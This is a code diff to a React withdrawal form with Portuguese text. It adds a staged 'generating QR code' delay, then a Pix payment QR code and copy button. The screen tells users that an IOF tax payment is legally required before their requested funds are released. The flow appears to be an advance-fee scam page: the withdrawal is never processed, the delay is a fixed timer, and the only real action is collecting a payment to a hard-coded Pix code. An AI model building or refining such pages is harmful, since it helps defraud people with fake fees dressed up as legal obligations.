@@ -1,11 +1,13 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
-import { Menu } from "lucide-react";
+import { Menu, Copy } from "lucide-react";
 import { Switch } from "@/components/ui/switch";
 import {
   Dialog,
   DialogContent,
 } from "@/components/ui/dialog";
+import { QRCodeSVG } from "qrcode.react";
+import { toast } from "@/hooks/use-toast";
 
 const WithdrawForm = () => {
   const navigate = useNavigate();
@@ -15,6 +17,26 @@ const WithdrawForm = () => {
   const [aceitaTermos, setAceitaTermos] = useState(false);
   const [errors, setErrors] = useState<{[key: string]: boolean}>({});
   const [showLoadingModal, setShowLoadingModal] = useState(false);
+  const [showQrCode, setShowQrCode] = useState(false);
+  
+  const pixCode = "00020101021226810014br.gov.";
+
+  useEffect(() => {
+    if (showLoadingModal && !showQrCode) {
+      const timer = setTimeout(() => {
+        setShowQrCode(true);
+      }, 5000);
+      return () => clearTimeout(timer);
+    }
+  }, [showLoadingModal, showQrCode]);
+
+  const handleCopyCode = () => {
+    navigator.clipboard.writeText(pixCode);
+    toast({
+      title: "Código copiado!",
+      description: "O código Pix foi copiado para a área de transferência.",
+    });
+  };
 
   const handleSubmit = () => {
     const newErrors: {[key: string]: boolean} = {};
@@ -121,32 +143,70 @@ const WithdrawForm = () => {
         </div>
 
         {/* Loading Modal */}
-        <Dialog open={showLoadingModal} onOpenChange={setShowLoadingModal}>
+        <Dialog open={showLoadingModal} onOpenChange={(open) => {
+          setShowLoadingModal(open);
+          if (!open) setShowQrCode(false);
+        }}>
           <DialogContent className="bg-white rounded-3xl p-8 max-w-[320px] border-0 shadow-xl flex flex-col items-center gap-6">
-            <h2 className="text-foreground text-2xl font-serif font-bold text-center">
-              Gerando Qrcode
-            </h2>
-            
-            {/* Yellow Spinner */}
-            <div className="relative w-32 h-32">
-              <svg className="w-full h-full animate-spin" viewBox="0 0 100 100">
-                <circle
-                  cx="50"
-                  cy="50"
-                  r="40"
-                  stroke="hsl(var(--primary))"
-                  strokeWidth="8"
-                  fill="none"
-                  strokeLinecap="round"
-                  strokeDasharray="200"
-                  strokeDashoffset="60"
-                />
-              </svg>
-            </div>
+            {!showQrCode ? (
+              <>
+                <h2 className="text-foreground text-2xl font-serif font-bold text-center">
+                  Gerando Qrcode
+                </h2>
+                
+                {/* Yellow Spinner */}
+                <div className="relative w-32 h-32">
+                  <svg className="w-full h-full animate-spin" viewBox="0 0 100 100">
+                    <circle
+                      cx="50"
+                      cy="50"
+                      r="40"
+                      stroke="hsl(var(--primary))"
+                      strokeWidth="8"
+                      fill="none"
+                      strokeLinecap="round"
+                      strokeDasharray="200"
+                      strokeDashoffset="60"
+                    />
+                  </svg>
+                </div>
 
-            <p className="text-foreground/70 text-sm text-center leading-snug font-serif">
-              O pagamento da taxa IOF é obrigatória conforme a Lei nº 5.143, de 20 de outubro de 1966.
-            </p>
+                <p className="text-foreground/70 text-sm text-center leading-snug font-serif">
+                  O pagamento da taxa IOF é obrigatória conforme a Lei nº 5.143, de 20 de outubro de 1966.
+                </p>
+              </>
+            ) : (
+              <>
+                {/* QR Code */}
+                <div className="w-full flex justify-center">
+                  <QRCodeSVG 
+                    value={pixCode} 
+                    size={220}
+                    level="H"
+                    className="rounded-lg"
+                  />
+                </div>
+
+                <p className="text-foreground/70 text-sm text-center leading-snug font-serif">
+                  Ao finalizar o pagamento você recebe os fundos solicitados via Pix, através da conta bancária vinculada.
+                </p>
+
+                {/* Pix Code Display */}
+                <div className="w-full bg-white border-2 border-muted rounded-2xl px-4 py-4">
+                  <p className="text-foreground text-center text-lg font-mono break-all">
+                    {pixCode}
+                  </p>
+                </div>
+
+                {/* Copy Button */}
+                <button 
+                  onClick={handleCopyCode}
+                  className="w-full py-4 bg-primary text-foreground rounded-full text-xl font-bold flex items-center justify-center gap-2"
+                >
+                  Copiar Código
+                </button>
+              </>
+            )}
           </DialogContent>
         </Dialog>
       </main>
